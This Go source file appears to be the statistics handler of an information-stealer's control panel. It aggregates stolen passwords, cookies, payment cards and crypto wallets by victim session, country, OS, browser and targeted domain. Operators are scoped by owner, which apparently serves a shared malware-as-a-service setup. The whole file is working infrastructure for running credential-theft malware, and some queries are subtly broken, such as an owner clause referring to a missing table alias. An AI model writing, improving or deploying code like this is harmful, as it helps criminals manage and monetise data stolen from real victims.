package api

import (
	"database/sql"
	"net/http"

	"zialfi-panel/internal/middleware"
	"zialfi-panel/internal/ws"
)

type StatsHandler struct {
	db  *sql.DB
	hub *ws.Hub
}

type StatsResponse struct {
	Sessions        SessionStats    `json:"sessions"`
	Passwords       CountStats      `json:"passwords"`
	Cookies         CountStats      `json:"cookies"`
	Cards           CountStats      `json:"cards"`
	Wallets         CountStats      `json:"wallets"`
	Duplicates      DuplicateStats  `json:"duplicates"`
	Quality         QualityStats    `json:"quality"`
	Countries       int             `json:"countries"`
	Geo             []GeoEntry      `json:"geo"`
	Browsers        []BrowserEntry  `json:"browsers"`
	OSDistribution  []OSEntry       `json:"os_distribution"`
	Timeline        []TimelineEntry `json:"timeline"`
	TopDomains      []DomainEntry   `json:"top_domains"`
}

type DuplicateStats struct {
	Hwid int `json:"hwid"`
	Ip   int `json:"ip"`
}

type QualityStats struct {
	Valid      int     `json:"valid"`
	Total      int     `json:"total"`
	Percentage float64 `json:"percentage"`
}

type SessionStats struct {
	Total     int     `json:"total"`
	Today     int     `json:"today"`
	Yesterday int     `json:"yesterday"`
	Change    float64 `json:"change"`
}

type CountStats struct {
	Total     int     `json:"total"`
	Today     int     `json:"today"`
	Yesterday int     `json:"yesterday"`
	Change    float64 `json:"change"`
}

type OSEntry struct {
	OS    string `json:"os"`
	Count int    `json:"count"`
}

type GeoEntry struct {
	CountryCode string `json:"country_code"`
	Count       int    `json:"count"`
}

type BrowserEntry struct {
	Browser string `json:"browser"`
	Count   int    `json:"count"`
}

type TimelineEntry struct {
	Date  string `json:"date"`
	Count int    `json:"count"`
}

type DomainEntry struct {
	Domain string `json:"domain"`
	Count  int    `json:"count"`
}

func NewStatsHandler(db *sql.DB, hub *ws.Hub) *StatsHandler {
	return &StatsHandler{db: db, hub: hub}
}

func calcChange(today, yesterday int) float64 {
	if yesterday == 0 {
		if today > 0 {
			return 100
		}
		return 0
	}
	return float64(today-yesterday) / float64(yesterday) * 100
}

func (h *StatsHandler) Dashboard(w http.ResponseWriter, r *http.Request) {
	resp := StatsResponse{
		Sessions:       SessionStats{},
		Passwords:      CountStats{},
		Cookies:        CountStats{},
		Cards:          CountStats{},
		Wallets:        CountStats{},
		Geo:            []GeoEntry{},
		Browsers:       []BrowserEntry{},
		OSDistribution: []OSEntry{},
		Timeline:       []TimelineEntry{},
		TopDomains:     []DomainEntry{},
	}

	ownerClause := ""
	var ownerArgs []any
	if claims := middleware.ClaimsFromContext(r.Context()); claims != nil && claims.Role != "admin" {
		ownerClause = " AND s.owner_id = ?"
		ownerArgs = []any{claims.UserID}
	}

	// Sessions: total, today, yesterday
	h.db.QueryRow("SELECT COUNT(*) FROM sessions"+whereOwner("", ownerClause), ownerArgs...).Scan(&resp.Sessions.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM sessions s WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&resp.Sessions.Today)
	h.db.QueryRow("SELECT COUNT(*) FROM sessions s WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&resp.Sessions.Yesterday)
	resp.Sessions.Change = calcChange(resp.Sessions.Today, resp.Sessions.Yesterday)

	// Passwords: total, today, yesterday
	var pwToday, pwYesterday int
	h.db.QueryRow("SELECT COUNT(*) FROM passwords").Scan(&resp.Passwords.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&pwToday)
	h.db.QueryRow("SELECT COUNT(*) FROM passwords p JOIN sessions s ON s.id = p.session_id WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&pwYesterday)
	resp.Passwords.Today = pwToday
	resp.Passwords.Yesterday = pwYesterday
	resp.Passwords.Change = calcChange(pwToday, pwYesterday)

	// Cookies: total, today, yesterday
	var cToday, cYesterday int
	h.db.QueryRow("SELECT COUNT(*) FROM cookies").Scan(&resp.Cookies.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&cToday)
	h.db.QueryRow("SELECT COUNT(*) FROM cookies c JOIN sessions s ON s.id = c.session_id WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&cYesterday)
	resp.Cookies.Today = cToday
	resp.Cookies.Yesterday = cYesterday
	resp.Cookies.Change = calcChange(cToday, cYesterday)

	// Cards: total, today, yesterday
	var cdToday, cdYesterday int
	h.db.QueryRow("SELECT COUNT(*) FROM cards").Scan(&resp.Cards.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM cards d JOIN sessions s ON s.id = d.session_id WHERE date(s.created_at) = date('now')"+ownerClause, ownerArgs...).Scan(&cdToday)
	h.db.QueryRow("SELECT COUNT(*) FROM cards d JOIN sessions s ON s.id = d.session_id WHERE date(s.created_at) = date('now', '-1 day')"+ownerClause, ownerArgs...).Scan(&cdYesterday)
	resp.Cards.Today = cdToday
	resp.Cards.Yesterday = cdYesterday
	resp.Cards.Change = calcChange(cdToday, cdYesterday)

	// Wallets
	h.db.QueryRow("SELECT COUNT(*) FROM wallets").Scan(&resp.Wallets.Total)

	// Duplicates — sessions that share an hwid or ip with another session
	dupHwidQ := "SELECT COUNT(*) FROM (SELECT hwid FROM sessions s WHERE s.hwid != ''" + ownerClause + " GROUP BY s.hwid HAVING COUNT(*) > 1)"
	dupIPQ := "SELECT COUNT(*) FROM (SELECT ip FROM sessions s WHERE s.ip != ''" + ownerClause + " GROUP BY s.ip HAVING COUNT(*) > 1)"
	h.db.QueryRow(dupHwidQ, ownerArgs...).Scan(&resp.Duplicates.Hwid)
	h.db.QueryRow(dupIPQ, ownerArgs...).Scan(&resp.Duplicates.Ip)

	// Quality — share of passwords with a non-empty value AND a non-empty url
	h.db.QueryRow("SELECT COUNT(*) FROM passwords").Scan(&resp.Quality.Total)
	h.db.QueryRow("SELECT COUNT(*) FROM passwords WHERE password_value != '' AND url != ''").Scan(&resp.Quality.Valid)
	if resp.Quality.Total > 0 {
		resp.Quality.Percentage = float64(resp.Quality.Valid) / float64(resp.Quality.Total) * 100
	}

	// Countries — distinct non-empty country_code values
	h.db.QueryRow("SELECT COUNT(DISTINCT s.country_code) FROM sessions s WHERE s.country_code != ''"+ownerClause, ownerArgs...).Scan(&resp.Countries)

	geoRows, err := h.db.Query("SELECT s.country_code, COUNT(*) as c FROM sessions s WHERE s.country_code != ''"+ownerClause+" GROUP BY s.country_code ORDER BY c DESC LIMIT 20", ownerArgs...)
	if err == nil {
		defer geoRows.Close()
		for geoRows.Next() {
			var e GeoEntry
			if geoRows.Scan(&e.CountryCode, &e.Count) == nil {
				resp.Geo = append(resp.Geo, e)
			}
		}
	}

	// OS Distribution
	osRows, err := h.db.Query("SELECT COALESCE(NULLIF(s.os, ''), 'Unknown') as os, COUNT(*) as c FROM sessions s WHERE 1=1"+ownerClause+" GROUP BY os ORDER BY c DESC LIMIT 10", ownerArgs...)
	if err == nil {
		defer osRows.Close()
		for osRows.Next() {
			var e OSEntry
			if osRows.Scan(&e.OS, &e.Count) == nil {
				resp.OSDistribution = append(resp.OSDistribution, e)
			}
		}
	}

	// Browsers
	browserRows, err := h.db.Query("SELECT p.browser, COUNT(*) as c FROM passwords p WHERE p.browser != '' GROUP BY p.browser ORDER BY c DESC", ownerArgs...)
	if err == nil {
		defer browserRows.Close()
		for browserRows.Next() {
			var e BrowserEntry
			if browserRows.Scan(&e.Browser, &e.Count) == nil {
				resp.Browsers = append(resp.Browsers, e)
			}
		}
	}

	// Timeline
	timelineRows, err := h.db.Query("SELECT date(s.created_at) as d, COUNT(*) FROM sessions s WHERE s.created_at >= datetime('now', '-30 days')"+ownerClause+" GROUP BY d ORDER BY d", ownerArgs...)
	if err == nil {
		defer timelineRows.Close()
		for timelineRows.Next() {
			var e TimelineEntry
			if timelineRows.Scan(&e.Date, &e.Count) == nil {
				resp.Timeline = append(resp.Timeline, e)
			}
		}
	}

	// Top Domains
	domainRows, err := h.db.Query(`
		SELECT
			COALESCE(
				CASE
					WHEN p.url LIKE 'https://%' THEN SUBSTR(p.url, 9)
					WHEN p.url LIKE 'http://%' THEN SUBSTR(p.url, 8)
					ELSE p.url
				END,
				p.url
			) as domain,
			COUNT(*) as c
		FROM passwords p
		WHERE p.url != ''
		GROUP BY domain
		ORDER BY c DESC
		LIMIT 20
	`)
	if err == nil {
		defer domainRows.Close()
		for domainRows.Next() {
			var e DomainEntry
			if domainRows.Scan(&e.Domain, &e.Count) == nil {
				resp.TopDomains = append(resp.TopDomains, e)
			}
		}
	}

	writeJSON(w, http.StatusOK, resp)

	if h.hub != nil {
		event := ws.NewStatsEvent(ws.StatsPayload{
			SessionsTotal:  resp.Sessions.Total,
			SessionsToday:  resp.Sessions.Today,
			PasswordsTotal: resp.Passwords.Total,
		})
		if uid := claimsUserID(r); uid != "" {
			h.hub.Broadcast("stats:"+uid, event)
		}
	}
}

// whereOwner joins an owner clause onto an existing WHERE-less query.
func whereOwner(base, ownerClause string) string {
	if ownerClause == "" {
		return ""
	}
	if base == "" {
		return " WHERE 1=1" + ownerClause
	}
	return " WHERE " + base + ownerClause
}
